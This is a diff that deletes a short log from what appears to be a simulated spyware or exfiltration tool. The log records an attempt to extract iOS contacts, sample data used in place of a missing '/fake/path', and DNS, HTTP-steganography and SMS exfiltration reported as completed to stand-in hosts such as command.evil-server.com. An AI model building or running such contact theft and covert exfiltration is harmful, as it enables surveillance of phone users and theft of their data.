@@ -1,6 +1,0 @@
-2025-08-05 01:08:38,962 - __main__ - ERROR - Surveillance failed: 'RealtimeSurveillanceEngine' object has no attribute 'start_video_capture'
-2025-08-05 01:08:39,276 - exfiltration_engine - ERROR - Error extracting iOS contacts: unable to open database file
-2025-08-05 01:08:39,287 - exfiltration_engine - WARNING - Database not found: /fake/path, using sample data
-2025-08-05 01:08:55,625 - exfiltration_engine - INFO - DNS exfiltration completed: 1000 bytes to command.evil-server.com
-2025-08-05 01:08:58,634 - exfiltration_engine - INFO - HTTP steganography exfiltration completed: 96 bytes to https://legitimate-photo-site.com/upload
-2025-08-05 01:08:58,850 - exfiltration_engine - INFO - SMS covert exfiltration completed: 0 bytes to +1234567890
